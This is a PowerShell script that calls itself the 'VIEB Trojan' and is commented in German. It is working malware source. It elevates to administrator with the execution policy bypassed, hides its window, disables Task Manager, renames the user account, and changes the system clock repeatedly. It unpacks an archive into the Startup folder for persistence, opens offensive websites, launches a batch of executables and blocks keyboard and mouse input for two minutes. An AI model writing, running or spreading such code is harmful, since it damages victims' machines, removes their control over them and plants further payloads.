
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$consoleWindow = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consoleWindow, 0) # Macht dass das Vieb.exe Fenster versteckt ist

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("Sie sind dabei VIEB zu starten Diese Software kann einen Virus enthalten. Moechten Sie fortfahren?", "VIEB Warning", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)

[System.Windows.Forms.MessageBox]::Show("Wenn sie diese warnung akzeptieren kann es dazu kommen das ihr System infiziert ist sie koennen nichts dagegen tun. Moechten sie fortfahren? Sie haben wenn sie diese meldung akzeptieren nur noch 5 sekunden zeit bevor diese Software startet!", "Virus Warning", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning) # Erstellt 2 Warnungen

New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Force

Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -Value 1 # Deaktiviert den Task-Manager 

$OldUsername = $env:UserName
$NewUsername = "VIEB was here"

Rename-LocalUser -Name $OldUsername -NewName $NewUsername

$counter = 5

while ($counter -gt 0) {
    Write-Host $counter
    Start-Sleep -Seconds 1
    $counter--
} # Mach ein Countdown von 5 Sekunden

$desktop = [Environment]::GetFolderPath("Desktop")
$file = "$desktop\VIEB.txt" 

New-Item -ItemType File -Path $file

Add-Content -Path $file -Value "YOUR COMPUTER FUCKED UP BY THE VIEB TROJAN. :D "


Start-Process $file # Erstellt eine txt Datei und öffnet sie 

start-sleep 3


for ($i = 0; $i -lt 2; $i++){
    Set-Date -Date "01/01/1973 01:11:00"
    Set-Date -Date "02/02/1902 03:12:00"
    Set-Date -Date "03/03/1910 02:40:00"
    Set-Date -Date "04/04/1917 04:22:00"
    Set-Date -Date "05/05/1923 06:11:00"
    Set-Date -Date "06/06/1929 05:17:00"
    Set-Date -Date "07/07/1935 07:24:00"
    Set-Date -Date "08/08/1940 06:43:00"
    Set-Date -Date "09/09/1944 08:00:00"
    Set-Date -Date "10/10/1950 11:52:00"
    Set-Date -Date "11/11/1955 23:13:00"
    Set-Date -Date "12/12/1960 14:43:00"
    Set-Date -Date "13/01/1967 03:03:00"
    Set-Date -Date "14/02/1972 07:21:00"
    Set-Date -Date "15/03/1976 09:15:00"
    Set-Date -Date "16/04/1980 11:33:00"
    Set-Date -Date "17/05/1985 17:56:00"
    Set-Date -Date "18/06/1990 22:08:00"
    Set-Date -Date "19/07/1995 11:01:00"
    Set-Date -Date "20/08/2000 01:12:00"
    Set-Date -Date "21/09/2011 04:17:00"
    Set-Date -Date "22/10/2010 09:18:00"
    Set-Date -Date "23/11/2015 00:19:00"
    Set-Date -Date "24/12/2020 23:00:00"
    }
    $zip_filename = "Crasher.zip"
    $startup_folder = [Environment]::GetFolderPath("Startup")
    $found = $false
    
    foreach ($drive in @("C:", "D:", "E:", "F:", "G:")) {
        foreach ($file in Get-ChildItem -Path $drive -File) {
            if ($file.Name -eq $zip_filename) {
                $filepath = Join-Path $file.Directory.FullName $file.Name
                Expand-Archive -Path $filepath -DestinationPath $startup_folder
                Write-Host "$($zip_filename) wurde im Startordner entpackt."
                $found = $true
                break
            }
        }
        if ($found) {
            break
        }
    }
    if (!$found) {
        Write-Host "$($zip_filename) wurde nicht gefunden." # Sucht nach einer bestimmten Zip Datei und entpackt sie im Startup Ordner 
    }

Clear-Host #Leert die Konsole

$url = "https://www.wikihow.com/Make-Friends"
Start-Process "chrome.exe" $url
start-sleep 8
$url1 = "https://www.wikihow.com/Tell-a-Friend-You%27re-Gay-and-You-Love-Them"
Start-Process "chrome.exe" $url1
start-sleep 8
$url2 = "https://www.thrillist.com/vice/how-to-buy-illegal-drugs-online-with-the-darknet-tor-bitcoin-and-more-explained"
Start-Process "chrome.exe" $url2
start-sleep 8
$url3 = "https://www.wikihow.com/Buy-a-Gun"
Start-Process "chrome.exe" $url3
start-sleep 8
$url4 = "https://hurensohn.online/"
Start-Process "chrome.exe" $url4 #Öffnet 5 Internetseiten mit Chrome

 start-sleep 15
$startupFolder = Join-Path $env:UserProfile "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$executables = "Circle.exe", "Circle2.exe", "CircleR.exe", "Dun.exe", "Dun2.exe", "FIRST.exe", "FIRST3.exe", "LAST2.exe", "RGB.exe", "RGB2.exe", "rotate.exe", "Shake.exe", "Squares.exe", "Squares2.exe", "Squares3.exe", "wave.exe", "Whoa.exe", "Date.exe"

foreach ($executable in $executables) {
    $exe = Join-Path $startupFolder $executable
    Start-Process $exe
    Start-Sleep -Seconds 0.5 # Startet alle 17 exe Dateien
}

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }

$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@

$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru

function Disable-UserInput($seconds) {
    $userInput::BlockInput($true)
    Start-Sleep $seconds
    $userInput::BlockInput($false)
}

Disable-UserInput -seconds 121 | Out-Null # Deaktiviert den User_Imput